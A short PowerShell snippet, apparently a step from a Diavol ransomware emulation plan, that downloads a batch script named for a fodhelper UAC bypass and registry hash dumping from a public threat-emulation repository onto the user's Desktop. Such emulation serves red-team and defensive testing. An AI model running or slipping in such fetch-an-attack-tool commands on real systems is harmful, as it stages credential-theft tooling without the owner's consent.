

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Invoke-WebRequest -Uri 'https://github.com/scythe-io/community-threats/blob/master/Diavol/VFS/fodhelper_reg_hashes.bat' -OutFile $env:UserProfile\Desktop\Diavol\fodhelper_reg_hashes.bat